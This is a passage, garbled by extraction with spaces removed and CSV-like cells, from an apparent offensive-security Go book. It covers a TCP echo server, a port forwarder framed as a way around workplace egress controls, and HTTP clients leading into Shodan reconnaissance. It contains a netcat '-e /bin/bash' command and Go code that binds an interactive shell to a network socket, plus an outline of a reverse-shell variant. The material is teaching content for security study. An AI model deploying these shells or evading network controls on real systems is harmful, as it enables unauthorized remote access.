).,NA,NA
Bothbufferedinstancescontaincomplementaryfunctions ,NA,NA
forreadingandwritingstringdata.,"ReadString(
 byte
 )",NA
❷takesa ,NA,NA
"delimitercharacterusedtodenotehowfartoread,whereas ","WriteString(
 byte
 )",NA
❹writesthestringtothesocket.Whenwriting ,NA,NA
"data,youneedtoexplicitlycall",writer.Flush(),NA
❺toflushwriteall ,NA,NA
"thedatatotheunderlyingwriter(inthiscase,a",Conn,NA
instance).,NA,NA
Althoughthepreviousexamplesimplifiestheprocessby ,NA,NA
"usingbufferedI/O,youcanreframeittousethe","Copy(Writer, 
 Reader)",NA
conveniencefunction.Recallthatthisfunctiontakesas ,NA,NA
inputadestination,Writer,NA
andasource,Reader,NA
",simplycopying ",NA,NA
fromsourcetodestination.,NA,NA
"Inthisexample,you’llpassthe",conn,NA
variableasboththe ,NA,NA
sourceanddestinationbecauseyou’llbeechoingthecontents,NA,NA
backontheestablishedconnection:,"funcecho(connnet.Conn){
  
  
 deferconn.Close()
  
  
 //Copydatafromio.Readertoio.Writerviaio.Copy().
  
  
 if_,err:=io.Copy(conn,conn);err!=nil{
  
  
 log.Fatalln(""Unabletoread/writedata"")
  
  
 }
  
  
 }",NA
You’veexploredthebasicsofI/OandappliedittoTCP ,NA,NA
"servers.Nowit’stimetomoveontomoreusable,relevant ",NA,NA
examples.,NA,NA
ProxyingaTCPClient,NA,NA
"Nowthatyouhaveasolidfoundation,youcantakewhat ",NA,NA
you’velearneduptothispointandcreateasimpleport ,NA,NA
forwardertoproxyaconnectionthroughanintermediary ,NA,NA
"serviceorhost.Asmentionedearlierinthischapter,thisis ",NA,NA
usefulfortryingtocircumventrestrictiveegresscontrolsorto ,NA,NA
leverageasystemtobypassnetworksegmentation.,NA,NA
"Beforelayingoutthecode,considerthisimaginarybut ",NA,NA
realisticproblem:Joeisanunderperformingemployeewho ,NA,NA
worksforACMEInc.asabusinessanalystmakinga ,NA,NA
handsomesalarybasedonslightexaggerationsheincludedon ,NA,NA
"hisresume.(DidhereallygotoanIvyLeagueschool?Joe, ",NA,NA
that’snotveryethical.)Joe’slackofmotivationismatched ,NA,NA
onlybyhisloveforcats—somuchsothatJoeinstalledcat ,NA,NA
"camerasathomeandhostedasite,",NA,NA
joescatcam.website,NA,NA
", ",NA,NA
throughwhichhecouldremotelymonitorthedander-filled ,NA,NA
"fluffbags.Oneproblem,though:ACMEisontoJoe.They ",NA,NA
don’tlikethathe’sstreaminghiscatcam24/7in4Kultra high-,NA,NA
"def,usingvaluableACMEnetworkbandwidth.ACME",NA,NA
hasevenblockeditsemployeesfromvisitingJoe’scatcam ,NA,NA
website.,NA,NA
Joehasanidea.“WhatifIsetupaport-forwarderonan ,NA,NA
"internet-basedsystemIcontrol,”Joesays,“andforcethe ",NA,NA
redirectionofalltrafficfromthathostto,NA,NA
joescatcam.website,NA,NA
?”J,NA,NA
oechecksatworkthefollowingdayandconfirmshecan ,NA,NA
"accesshispersonalwebsite,hostedatthe",NA,NA
joesproxy.com ,NA,NA
"domain.Joeskipshisafternoonmeetings,headstoacoffee ",NA,NA
"shop,andquicklycodesasolutiontohisproblem.He’ll ",NA,NA
forwardalltrafficreceivedat,NA,NA
http://joesproxy.com,NA,NA
to ,NA,NA
http://joescatcam.website,NA,NA
.,NA,NA
"Here’sJoe’scode,whichherunsonthe",NA,NA
joesproxy.com ,NA,NA
server:,"funchandle(srcnet.Conn){ 
  
 dst,err:=net.Dial(""tcp"",""joescatcam.website:80"")❶ife
 rr!=nil{
  
 log.Fatalln(""Unabletoconnecttoourunreachablehost"") } 
  
 deferdst.Close()
  
 //Runingoroutinetopreventio.Copyfromblocking❷g
 ofunc(){ 
  
 //Copyoursource'soutputtothedestination 
  
 if_,err:=io.Copy(dst,src)❸;err!=nil{ 
  
 log.Fatalln(err)
  
 } 
  
 }()
  
 //Copyourdestination'soutputbacktooursource 
 if_,err:=io.Copy(src,dst)❹;err!=nil{ 
  
 log.Fatalln(err)
  
 } 
  
 } 
  
 funcmain(){ 
  
 //Listenonlocalport80
  
 listener,err:=net.Listen(""tcp"","":80"")",NA
StartbyexaminingJoe’s,handle(net.Conn),NA
function.Joe ,NA,NA
connectsto,NA,NA
joescatcam.website,NA,NA
❶(recallthatthisunreachabl,NA,NA
e hostisn’tdirectlyaccessiblefromJoe’scorporate ,NA,NA
workstation).Joethenuses,"Copy(Writer,Reader)",NA
twoseparate ,NA,NA
times.Thefirstinstance❸ensuresthatdatafromtheinbound ,NA,NA
connectioniscopiedtothe,NA,NA
joescatcam.website,NA,NA
connection.,NA,NA
Thesecondinstance❹ensuresthatdatareadfrom ,NA,NA
joescatcam.website,NA,NA
iswrittenbacktotheconnectingclient’s ,NA,NA
connection.Because,"Copy(Writer,Reader)",NA
"isablockingfunction,",NA,NA
andwillcontinuetoblockexecutionuntilthenetwork ,NA,NA
"connectionisclosed,Joewiselywrapshisfirstcallto ","Copy(Writer,Reader)",NA
inanewgoroutine❷.Thisensuresthat ,NA,NA
executionwithinthe,handle(net.Conn),NA
"functioncontinues,andth",NA,NA
e,NA,NA
second,"Copy(Writer,Reader)",NA
callcanbemade.,NA,NA
Joe’sproxylistensonport80andrelaysanytraffic ,NA,NA
receivedfromaconnectiontoandfromport80on ,NA,NA
joescatcam.website.,NA,NA
"Joe,thatcrazyandwastefulman, ",NA,NA
confirmsthathecanconnectto,NA,NA
joescatcam.website,NA,NA
via ,NA,NA
joesproxy.com,NA,NA
byconnectingwith,curl,NA
:,NA,NA
"Atthispoint,Joehasdoneit.He’slivingthedream,",NA,NA
wastingACME-sponsoredtimeandnetworkbandwidthwhile,NA,NA
"hewatcheshiscats.Today,therewillbecats!",NA,NA
ReplicatingNetcatforCommandExecution,NA,NA
"Inthissection,let’sreplicatesomeofNetcat’smore",NA,NA
"interestingfunctionality—specifically,itsgapingsecurityhole.",NA,NA
Netcat,NA,NA
"istheTCP/IPSwissArmyknife—essentially,a",NA,NA
"moreflexible,scriptableversionofTelnet.Itcontainsafeature",NA,NA
thatallowsstdinandstdoutofanyarbitraryprogramtobe,NA,NA
"redirectedoverTCP,enablinganattackerto,forexample,turn",NA,NA
asinglecommandexecutionvulnerabilityintooperating,NA,NA
systemshellaccess.Considerthefollowing:,"$
 nc–lp13337–e/bin/bash",NA
Thiscommandcreatesalisteningserveronport13337.,NA,NA
"Anyremoteclientthatconnects,perhapsviaTelnet,wouldbe",NA,NA
abletoexecutearbitrarybashcommands—hencethereason,NA,NA
thisisreferredtoasa,NA,NA
gapingsecurityhole,NA,NA
.Netcatallowsyou,NA,NA
tooptionallyincludethisfeatureduringprogramcompilation.,NA,NA
"(Forgoodreason,mostNetcatbinariesyou’llfindonstandard",NA,NA
Linuxbuildsdo,NA,NA
not,NA,NA
includethisfeature.)It’sdangerous ,NA,NA
enoughthatwe’llshowyouhowtocreateitinGo!,NA,NA
"First,lookatGo’s",os/exec,NA
package.You’llusethatfor ,NA,NA
runningoperatingsystemcommands.Thispackagedefinesa ,NA,NA
"type,",Cmd,NA
",thatcontainsnecessarymethodsandpropertiesto ",NA,NA
runcommandsandmanipulatestdinandstdout.You’ll ,NA,NA
redirectstdin(a,Reader,NA
)andstdout(a,Writer,NA
)toa,Conn,NA
instance ,NA,NA
(whichisbotha,Reader,NA
anda,Writer,NA
).,NA,NA
"Whenyoureceiveanewconnection,youcanusethe ","Command(
 namestring
 ,
 arg...string
 )",NA
functionfrom,os/exec,NA
tocreatea ,NA,NA
new,Cmd,NA
instance.Thisfunctiontakesasparametersthe ,NA,NA
operatingsystemcommandandanyarguments.Inthis ,NA,NA
"example,hardcode",/bin/sh,NA
asthecommandandpass,-i,NA
asan ,NA,NA
"argumentsuchthatyou’reininteractivemode,whichallows ",NA,NA
youtomanipulatestdinandstdoutmorereliably:,"cmd:=exec.Command(""/bin/sh"",""-i"")",NA
Thiscreatesaninstanceof,Cmd,NA
butdoesn’tyetexecutethe ,NA,NA
command.Youhaveacoupleofoptionsformanipulating ,NA,NA
stdinandstdout.Youcoulduse,"Copy(Writer,Reader)",NA
asdiscussed ,NA,NA
"previously,ordirectlyassign",Reader,NA
and,Writer,NA
to,Cmd,NA
.Let’s ,NA,NA
directlyassignyour,Conn,NA
objecttoboth,cmd.Stdin,NA
and,cmd.Stdout,NA
", ",NA,NA
likeso:,"cmd.Stdin=conn
  
  
 cmd.Stdout=conn",NA
"Withthesetupofthecommandandthestreamscomplete, ",NA,NA
yourunthecommandbyusing,cmd.Run(),NA
:,iferr:=cmd.Run();err!=nil{,NA
ThislogicworksperfectlyfineonLinuxsystems.,NA,NA
"However,whentweakingandrunningtheprogramona ",NA,NA
"Windowssystem,running",cmd.exe,NA
insteadof,/bin/bash,NA
",you’llfind",NA,NA
thattheconnectingclientneverreceivesthecommandoutpu,NA,NA
t becauseofsomeWindows-specifichandlingofanonymous ,NA,NA
pipes.Herearetwosolutionsforthisproblem.,NA,NA
"First,youcantweakthecodetoexplicitlyforcethe ",NA,NA
flushingofstdouttocorrectthisnuance.Insteadofassigning ,Conn,NA
directlyto,cmd.Stdout,NA
",youimplementacustom",Writer,NA
that,NA,NA
wraps,bufio.Writer,NA
(abufferedwriter)andexplicitlycallsits,Flush,NA
methodtoforcethebuffertobeflushed.Refertothe,NA,NA
“CreatingtheEchoServer”on,NA,NA
page35,NA,NA
foranexemplaryuse ,NA,NA
of,bufio.Writer,NA
.,NA,NA
"Here’sthedefinitionofthecustomwriter,",Flusher,NA
:,"//Flusherwrapsbufio.Writer,explicitlyflushingonallwrites.
  
 typeFlusherstruct{ 
  
 w*bufio.Writer
  
 }
  
  
 //NewFlushercreatesanewFlusherfromanio.Writer.
  
 funcNewFlusher(wio.Writer)*Flusher{ 
  
 return&Flusher{ 
  
 w:bufio.NewWriter(w), 
  
 }
  
 }
  
  
 //Writewritesbytesandexplicitlyflushesbuffer.❶
 func(foo*Flusher)Write(b[]byte)(int,error){ 
 count,err:=foo.w.Write(b)❷
  
 iferr!=nil{
  
  
 return-1,err",NA
The,Flusher,NA
typeimplementsa,Write([]byte),NA
function❶that ,NA,NA
writes❷thedatatotheunderlyingbufferedwriterandthen ,NA,NA
flushes❸theoutput.,NA,NA
"Withtheimplementationofacustomwriter,youcantweak",NA,NA
theconnectionhandlertoinstantiateandusethis,Flusher,NA
custom,NA,NA
typefor,cmd.Stdout,NA
:,"funchandle(connnet.Conn){
  
 //Explicitlycalling/bin/shandusing-iforinteractivemode
  
 //sothatwecanuseitforstdinandstdout.
  
 //ForWindowsuseexec.Command(""cmd.exe"").
  
 cmd:=exec.Command(""/bin/sh"",""-i"")
  
  
 //Setstdintoourconnection
  
  
 cmd.Stdin=conn
  
  
 //CreateaFlusherfromtheconnectiontouseforstdout.
  
 //Thisensuresstdoutisflushedadequatelyandsentvianet.Conn.
  
 cmd.Stdout=NewFlusher(conn)
  
  
 //Runthecommand.
  
 iferr:=cmd.Run();err!=nil{
  
 log.Fatalln(err)
  
 }
  
 }",NA
"Thissolution,whileadequate,certainlyisn’telegant.",NA,NA
"Althoughworkingcodeismoreimportantthanelegantcode,",NA,NA
we’llusethisproblemasanopportunitytointroducethe,NA,NA
"function,Go’ssynchronous,in-memorypipethatcan",NA,NA
beusedforconnecting,Readers,NA
and,Writers,NA
:,"funcPipe()(*PipeReader,*PipeWriter)",NA
Using,PipeReader,NA
and,PipeWriter,NA
allowsyoutoavoidhavingto,NA,NA
explicitlyflushthewriterandsynchronouslyconnectstdout ,NA,NA
"andtheTCPconnection.Youwill,yetagain,rewritethe ",NA,NA
handlerfunction:,"funchandle(connnet.Conn){
  
 //Explicitlycalling/bin/shandusing-iforinteractivemode 
 //sothatwecanuseitforstdinandstdout.
  
 //ForWindowsuseexec.Command(""cmd.exe"").
  
 cmd:=exec.Command(""/bin/sh"",""-i"")
  
 //Setstdintoourconnection 
  
 rp,wp:=io.Pipe()❶
  
 cmd.Stdin=conn
  
 ❷cmd.Stdout=wp
  
 ❸goio.Copy(conn,rp) 
  
 cmd.Run()
  
 conn.Close()
  
 }",NA
Thecallto,io.Pipe(),NA
❶createsbothareaderandawriterthat ,NA,NA
aresynchronouslyconnected—anydatawrittentothewriter ,NA,NA
(,wp,NA
inthisexample)willbereadbythereader(,rp,NA
").So,you ",NA,NA
assignthewriterto,cmd.Stdout,NA
❷andthenuse,"io.Copy(conn,rp)",NA
❸to,NA,NA
linkthe,PipeReader,NA
totheTCPconnection.Youdothisby,NA,NA
usingagoroutinetopreventthecodefromblocking.Any ,NA,NA
standardoutputfromthecommandgetssenttothewriterand ,NA,NA
thensubsequentlypipedtothereaderandoutovertheTCP ,NA,NA
connection.How’sthatforelegant?,NA,NA
"Withthat,you’vesuccessfullyimplementedNetcat’s",NA,NA
gapingsecurityholefromtheperspectiveofaTCPlistener ,NA,NA
awaitingaconnection.Youcanusesimilarlogictoimplement ,NA,NA
thefeaturefromtheperspectiveofaconnectingclient ,NA,NA
redirectingstdoutandstdinofalocalbinarytoaremote ,NA,NA
"listener.Theprecisedetailsarelefttoyoutodetermine,but ",NA,NA
wouldlikelyincludethefollowing:,"Establishaconnectiontoaremotelistenervianet.Dial(
 network
 ,
 addressstring
 ).
  
  
 InitializeaCmdviaexec.Command(
 namestring
 ,
 arg...string
 ).
  
  
 RedirectStdinandStdoutpropertiestoutilizethenet.Connobject.
  
  
 Runthecommand.",NA
"Atthispoint,thelistenershouldreceiveaconnection.Any ",NA,NA
datasenttotheclientshouldbeinterpretedasstdinonthe ,NA,NA
"client,andanydatareceivedonthelistenershouldbe ",NA,NA
interpretedasstdout.Thefullcodeofthisexampleisavailable ,NA,NA
at,NA,NA
https://github.com/blackhat-go/bhg/blob/master/ch-,NA,NA
2/netcat-exec/,NA,NA
main.go,NA,NA
.,NA,NA
SUMMARY,NA,NA
Nowthatyou’veexploredpracticalapplicationsandusageof ,NA,NA
"Goasitrelatestonetworking,I/O,andconcurrency,let’s ",NA,NA
moveontocreatingusableHTTPclients.,NA,NA
3 ,NA,NA
HTTPCLIENTSANDREMOTE ,NA,NA
INTERACTIONWITHTOOLS,NA,NA
In,NA,NA
Chapter2,NA,NA
",youlearnedhowtoharnessthepowerofTCP ",NA,NA
withvarioustechniquesforcreatingusableclientsandservers,NA,NA
. Thisisthefirstinaseriesofchaptersthatexploresavarietyof ,NA,NA
protocolsonhigherlayersoftheOSImodel.Becauseofits ,NA,NA
"prevalenceonnetworks,itsaffiliationwithrelaxedegress ",NA,NA
"controls,anditsgeneralflexibility,let’sbeginwithHTTP.",NA,NA
Thischapterfocusesontheclientside.Itwillfirst ,NA,NA
introduceyoutothebasicsofbuildingandcustomizingHTTP ,NA,NA
requestsandreceivingtheirresponses.Thenyou’lllearnhow ,NA,NA
toparsestructuredresponsedatasotheclientcaninterrogate ,NA,NA
theinformationtodetermineactionableorrelevantdata.,NA,NA
"Finally,you’lllearnhowtoapplythesefundamentalsby ",NA,NA
buildingHTTPclientsthatinteractwithavarietyofsecurity ,NA,NA
toolsandresources.Theclientsyoudevelopwillqueryand ,NA,NA
"consumetheAPIsofShodan,Bing,andMetasploitandwill ",NA,NA
searchandparsedocumentmetadatainamannersimilartothe ,NA,NA
metadatasearchtoolFOCA.,NA,NA
HTTPFUNDAMENTALSWITHGO,NA,NA
Althoughyoudon’tneedacomprehensiveunderstandingof ,NA,NA
"HTTP,youshouldknowsomefundamentalsbeforeyouget ",NA,NA
started.,NA,NA
"First,HTTPisa",NA,NA
statelessprotocol,NA,NA
:theserverdoesn’t ,NA,NA
"inherentlymaintainstateandstatusforeachrequest.Instead, ",NA,NA
"stateistrackedthroughavarietyofmeans,whichmayinclude ",NA,NA
"sessionidentifiers,cookies,HTTPheaders,andmore.The ",NA,NA
clientandservershavearesponsibilitytoproperlynegotiate ,NA,NA
andvalidatethisstate.,NA,NA
"Second,communicationsbetweenclientsandserverscan ",NA,NA
"occureithersynchronouslyorasynchronously,butthey ",NA,NA
operateonarequest/responsecycle.Youcanincludeseveral ,NA,NA
optionsandheadersintherequestinordertoinfluencethe ,NA,NA
behavioroftheserverandtocreateusablewebapplications. ,NA,NA
"Mostcommonly,servershostfilesthatawebbrowserrenders ",NA,NA
"toproduceagraphical,organized,andstylishrepresentationo",NA,NA
f thedata.Buttheendpointcanservearbitrarydatatypes.APIs ,NA,NA
"commonlycommunicateviamorestructureddataencoding, ",NA,NA
"suchasXML,JSON,orMSGRPC.Insomecases,thedata ",NA,NA
"retrievedmaybeinbinaryformat,representinganarbitrary ",NA,NA
filetypefordownload.,NA,NA
"Finally,Gocontainsconveniencefunctionssoyoucan ",NA,NA
quicklyandeasilybuildandsendHTTPrequeststoaserver ,NA,NA
andsubsequentlyretrieveandprocesstheresponse.Throug,NA,NA
h ,NA,NA
"someofthemechanismsyou’velearnedinpreviouschapters, ",NA,NA
you’llfindthattheconventionsforhandlingstructureddata ,NA,NA
proveextremelyconvenientwheninteractingwithHTTP ,NA,NA
APIs.,NA,NA
CallingHTTPAPIs,NA,NA
CallingHTTPAPIs,NA,NA
Let’sbegintheHTTPdiscussionbyexaminingbasicrequests. ,NA,NA
Go’s,net/http,NA
standardpackagecontainsseveralconvenience,NA,NA
"functionstoquicklyandeasilysendPOST,GET,andHEAD ",NA,NA
"requests,whicharearguablythemostcommonHTTPverbs ",NA,NA
you’lluse.Thesefunctionstakethefollowingforms:,"Get(
 urlstring
 )(resp*Response,errerror)
  
  
 Head(
 urlstring
 )(resp*Response,errerror)
  
  
 Post(
 urlstring
 ,
 bodyTypestring
 ,
 bodyio.Reader
 )(resp*Response,errerror)",NA
Eachfunctiontakes—asaparameter—theURLasastring ,NA,NA
valueandusesitfortherequest’sdestination.The,Post(),NA
functionisslightlymorecomplexthanthe,Get(),NA
and,Head(),NA
functions.,Post(),NA
takestwoadditionalparameters:,bodyType,NA
",",NA,NA
whichisastringvaluethatyouusefortheContent-Type ,NA,NA
HTTPheader(commonly,"application/x-www-form-
 urlencoded",NA
)ofthe,NA,NA
"requestbody,andan",io.Reader,NA
",whichyoulearnedaboutin",NA,NA
Chapter2,NA,NA
.,NA,NA
Youcanseeasampleimplementationofeachofthese ,NA,NA
functionsin,NA,NA
Listing3-1,NA,NA
.(Allthecodelistingsattheroot ,NA,NA
locationof/existundertheprovidedgithubrepo ,NA,NA
https://github.com/blackhat-go/bhg/,NA,NA
.)NotethatthePOST ,NA,NA
requestcreatestherequestbodyfromformvaluesandsetsthe ,NA,NA
"Content-Typeheader.Ineachcase,youmustclosethe ",NA,NA
responsebodyafteryou’redonereadingdatafromit.,"r1,err:=http.Get(""http://www.google.com/robots.txt"")
  
  
 //Readresponsebody.Notshown.
  
  
 deferr1.Body.Close()
  
  
 r2,err:=http.Head(""http://www.google.com/robots.txt"")
  
  
 //Readresponsebody.Notshown.
  
  
 deferr2.Body.Close()",NA
ThePOSTfunctioncall❶followsthefairlycommon ,NA,NA
patternofsettingtheContent-Typeto,"application/x-www-
 form-urlencoded",NA
"❷,whileURL-encodingformdata❸.",NA,NA
"GohasanadditionalPOSTrequestconveniencefunction,",NA,NA
called,PostForm(),NA
",whichremovesthetediousnessofsetting",NA,NA
thosevaluesandmanuallyencodingeveryrequest;youcan,NA,NA
seeitssyntaxhere:,"funcPostForm(
 urlstring
 ,
 dataurl.Values
 )(resp*Response,errerror)",NA
Ifyouwanttosubstitutethe,PostForm(),NA
functionforthe,Post(),NA
implementationin,NA,NA
Listing3-1,NA,NA
",youusesomethinglikethebold",NA,NA
codein,NA,NA
Listing3-2,NA,NA
.,"form:=url.Values{}
  
  
 form.Add(""foo"",""bar"")
  
  
 r3,err:=
 http.PostForm(""https://www.google.com/robots.txt"",form)
  
  
 //Readresponsebodyandclose.
  
 Listing3-2:Usingthe
 PostForm()
 functioninsteadof
 Post()
 (
 /ch-3/basic/main.go
 )",NA
"Unfortunately,noconveniencefunctionsexistforother",NA,NA
"HTTPverbs,suchasPATCH,PUT,orDELETE.You’lluse",NA,NA
"theseverbsmostlytointeractwithRESTfulAPIs,which ",NA,NA
employgeneralguidelinesonhowandwhyaservershould ,NA,NA
"usethem;butnothingissetinstone,andHTTPisliketheOld ",NA,NA
"Westwhenitcomestoverbs.Infact,we’veoftentoyedwith ",NA,NA
theideaofcreatinganewwebframeworkthatexclusively ,NA,NA
usesDELETEforeverything.we’dcallit,NA,NA
DELETE.js,NA,NA
",andit ",NA,NA
"wouldbeatophitonHackerNewsforsure.Byreadingthis, ",NA,NA
you’reagreeingnottostealthisidea!,NA,NA
GeneratingaRequest,NA,NA
"Togeneratearequestwithoneoftheseverbs,youcanusethe ",NewRequest(),NA
functiontocreatethe,Request,NA
"struct,whichyou’ll",NA,NA
subsequentlysendusingthe,Client,NA
function’s,Do(),NA
method.We,NA,NA
promisethatit’ssimplerthanitsounds.Thefunction ,NA,NA
prototypefor,http.NewRequest(),NA
isasfollows:,"funcNewRequest(❶
 method
 ,❷
 urlstring
 ,❸
 bodyio.Reader
 )(req*Request,err 
 error)",NA
YouneedtosupplytheHTTPverb❶anddestinationURL,NA,NA
❷to,NewRequest(),NA
asthefirsttwostringparameters.Muchlike ,NA,NA
thefirstPOSTexamplein,NA,NA
Listing3-1,NA,NA
",youcanoptionally ",NA,NA
supplytherequestbodybypassinginan,io.Reader,NA
asthethird ,NA,NA
andfinalparameter❸.,NA,NA
Listing3-3,NA,NA
showsacallwithoutanHTTPbody—a ,NA,NA
DELETErequest.,"req,err:=http.NewRequest(""DELETE"",""https://www.google.com/robots.txt"",nil
 )
  
  
 varclienthttp.Client
  
  
 resp,err:=client.Do(req)
  
  
 //Readresponsebodyandclose.
  
 Listing3-3:SendingaDELETErequest(
 /ch-3/basic/main.go
 )",NA
"Now,",NA,NA
Listing3-4,NA,NA
showsaPUTrequestwithan,io.Reader,NA
body(aPATCHrequestlookssimilar).,"form:=url.Values{}
  
  
 form.Add(""foo"",""bar"")
  
  
 varclienthttp.Client
  
  
 req,err:=http.NewRequest(
  
  
 ""PUT"",
  
  
 ""https://www.google.com/robots.txt"",
  
  
 strings.NewReader(form.Encode()),
  
  
 )
  
  
 resp,err:=client.Do(req)
  
  
 //Readresponsebodyandclose.
  
 Listing3-4:SendingaPUTrequest(
 /ch-3/basic/main.go
 )",NA
ThestandardGo,net/http,NA
librarycontainsseveralfunctions,NA,NA
thatyoucanusetomanipulatetherequestbeforeit’ssentto,NA,NA
theserver.You’lllearnsomeofthemorerelevantand,NA,NA
applicablevariantsasyouworkthroughpracticalexamples,NA,NA
"throughoutthischapter.Butfirst,we’llshowyouhowtodo",NA,NA
somethingmeaningfulwiththeHTTPresponsethattheserver,NA,NA
receives.,NA,NA
UsingStructuredResponseParsing,NA,NA
"Intheprevioussection,youlearnedthemechanismsfor",NA,NA
buildingandsendingHTTPrequestsinGo.Eachofthose,NA,NA
"examplesglossedoverresponsehandling,essentiallyignoring",NA,NA
itforthetimebeing.Butinspectingvariouscomponentsofthe,NA,NA
"HTTPresponseisacrucialaspectofanyHTTP-relatedtask,",NA,NA
"likereadingtheresponsebody,accessingcookiesandheaders,",NA,NA
orsimplyinspectingtheHTTPstatuscode.,NA,NA
Listing3-5,NA,NA
refinestheGETrequestin,NA,NA
Listing3-1,NA,NA
to,NA,NA
"displaythestatuscodeandresponsebody—inthiscase,",NA,NA
Google’s,NA,NA
robots.txt,NA,NA
file.Itusesthe,ioutil.ReadAll(),NA
functionto,NA,NA
"readdatafromtheresponsebody,doessomeerrorchecking,",NA,NA
andprintstheHTTPstatuscodeandresponsebodytostdout.,"❶resp,err:=http.Get(""https://www.google.com/robots.tx
 t"") iferr!=nil{
  
 log.Panicln(err)
  
 }
  
 //PrintHTTPStatus 
  
 fmt.Println(resp.Status❷)
  
  
 //Readanddisplayresponsebody 
  
 body,err:=ioutil.ReadAll(resp.Body❸) 
 iferr!=nil{
  
 log.Panicln(err)
  
 }
  
 fmt.Println(string(body)
 )
  
 ❹resp.Body.Close()
  
 Listing3-5:ProcessingtheHTTPresponsebody(
 /ch-3/basic/main.go
 )",NA
"Onceyoureceiveyourresponse,named",resp,NA
❶intheabove ,NA,NA
"code,youcanretrievethestatusstring(forexample,",200OK,NA
)by ,NA,NA
accessingtheexported,Status,NA
parameter❷;notshowninour ,NA,NA
"example,thereisasimilar",StatusCode,NA
parameterthataccesses,NA,NA
onlytheintegerportionofthestatusstring.,NA,NA
The,Response,NA
typecontainsanexported,Body,NA
"parameter❸, ",NA,NA
whichisoftype,io.ReadCloser,NA
.An,io.ReadCloser,NA
isaninterfacethat,NA,NA
actsasan,io.Reader,NA
aswellasan,io.Closer,NA
",oraninterfacethat",NA,NA
requirestheimplementationofa,Close(),NA
functiontoclosethe,NA,NA
readerandperformanycleanup.Thedetailsaresomewhat,NA,NA
inconsequential;justknowthatafterreadingthedatafroman ,io.ReadCloser,NA
",you’llneedtocallthe",Close(),NA
function❹onthe ,NA,NA
responsebody.Using,defer,NA
toclosetheresponsebodyisa,NA,NA
commonpractice;thiswillensurethatthebodyisclosed,NA,NA
beforeyoureturnit.,NA,NA
"Now,runthescripttoseetheerrorstatusandresponse ",NA,NA
body:,"$
 gorunmain.go
  
 200OK 
  
 User-agent:* 
  
 Disallow:/search 
  
 Allow:/search/about 
  
 Disallow:/sdch 
  
 Disallow:/groups 
  
 Disallow:/index.html?
  
 Disallow:/?
  
 Allow:/?hl= 
  
 Disallow:/?hl=*& 
  
 Allow:/?hl=*&gws_rd=ssl$ 
  
 Disallow:/?hl=*&*&gws_rd=ssl
  
 --
 snip
 --",NA
Ifyouencounteraneedtoparsemorestructureddata—and,NA,NA
it’slikelythatyouwill—youcanreadtheresponsebodyand ,NA,NA
decodeitbyusingtheconventionspresentedin,NA,NA
Chapter2,NA,NA
.For ,NA,NA
"example,imagineyou’reinteractingwithanAPIthat ",NA,NA
"communicatesusingJSON,andoneendpoint—say,",/ping,NA
—,NA,NA
returnsthefollowingresponseindicatingtheserverstate:,"{""Message"":""Allisgoodwiththeworld"",""Status"":""Success""}",NA
YoucaninteractwiththisendpointanddecodetheJSON,NA,NA
messagebyusingtheprogramin,NA,NA
Listing3-6,NA,NA
.,"packagemain
  
  
 import{
  
  
 encoding/json""
  
 HivaNetwork.Com",NA
Thecodebeginsbydefiningastructcalled,Status,NA
"❶,which ",NA,NA
containstheexpectedelementsfromtheserverresponse.The ,main(),NA
functionfirstsendsthePOSTrequest❷andthen ,NA,NA
"decodestheresponsebody❸.Afterdoingso,youcanquery ",NA,NA
the,Status,NA
structasyounormallywould—byaccessingexported ,NA,NA
datatypes,Status,NA
❹and,Message,NA
❺.,NA,NA
Thisprocessofparsingstructureddatatypesisconsistent,NA,NA
"acrossotherencodingformats,likeXMLorevenbinary",NA,NA
representations.Youbegintheprocessbydefiningastructto,NA,NA
representtheexpectedresponsedataandthendecodingthe ,NA,NA
dataintothatstruct.Thedetailsandactualimplementationof ,NA,NA
parsingotherformatswillbeleftuptoyoutodetermine.,NA,NA
Thenextsectionswillapplythesefundamentalconceptsto ,NA,NA
assistyouinbuildingtoolstointeractwiththird-partyAPIsfor ,NA,NA
thepurposeofenhancingadversarialtechniquesand ,NA,NA
reconnaissance.,NA,NA
BUILDINGANHTTPCLIENTTHAT ,NA,NA
INTERACTSWITHSHODAN,NA,NA
Priortoperforminganyauthorizedadversarialactivities ,NA,NA
"againstanorganization,anygoodattackerbeginswith ",NA,NA
"reconnaissance.Typically,thisstartswithpassivetechniques ",NA,NA
"thatdon’tsendpacketstothetarget;thatway,detectionofthe ",NA,NA
activityisnexttoimpossible.Attackersuseavarietyof ,NA,NA
"sourcesandservices—includingsocialnetworks,public ",NA,NA
"records,andsearchengines—togainpotentiallyuseful ",NA,NA
informationaboutthetarget.,NA,NA
It’sabsolutelyincrediblehowseeminglybenign ,NA,NA
informationbecomescriticalwhenenvironmentalcontextis ,NA,NA
"appliedduringachainedattackscenario.Forexample,aweb ",NA,NA
"applicationthatdisclosesverboseerrormessagesmay,alone",NA,NA
", beconsideredlowseverity.However,iftheerrormessages ",NA,NA
"disclosetheenterpriseusernameformat,andifthe ",NA,NA
"organizationusessingle-factorauthenticationforitsVPN, ",NA,NA
thoseerrormessagescouldincreasethelikelihoodofan ,NA,NA
internalnetworkcompromisethroughpassword-guessing ,NA,NA
attacks.,NA,NA
Maintainingalowprofilewhilegatheringtheinformation,NA,NA
ensuresthatthetarget’sawarenessandsecurityposture ,NA,NA
"remainsneutral,increasingthelikelihoodthatyourattackwill ",NA,NA
besuccessful.,NA,NA
Shodan,NA,NA
(,NA,NA
https://www.shodan.io/,NA,NA
"),self-describedas“the ",NA,NA
world’sfirstsearchengineforinternet-,NA,NA
"connecteddevices,”facilitatespassivereconnaissancebymai",NA,NA
ntainingasearchable ,NA,NA
"databaseofnetworkeddevicesandservices,including ",NA,NA
"metadatasuchasproductnames,versions,locale,andmore. ",NA,NA
"ThinkofShodanasarepositoryofscandata,evenifitdoes ",NA,NA
"much,muchmore.",NA,NA
ReviewingtheStepsforBuildinganAPIClient,NA,NA
"Inthenextfewsections,you’llbuildanHTTPclientthat ",NA,NA
"interactswiththeShodanAPI,parsingtheresultsand ",NA,NA
"displayingrelevantinformation.First,you’llneedaShodan ",NA,NA
"APIkey,whichyougetafteryouregisteronShodan’s ",NA,NA
"website.Atthetimeofthiswriting,thefeeisfairlynominal ",NA,NA
"forthelowesttier,whichoffersadequatecreditsforindividual ",NA,NA
"use,sogosignupforthat.Shodanoccasionallyoffers ",NA,NA
"discountedpricing,somonitoritcloselyifyouwanttosavea ",NA,NA
fewbucks.,NA,NA
"Now,getyourAPIkeyfromthesiteandsetitasan ",NA,NA
environmentvariable.Thefollowingexampleswillworkas-is ,NA,NA
onlyifyousaveyourAPIkeyasthevariable,SHODAN_API_KEY,NA
.,NA,NA
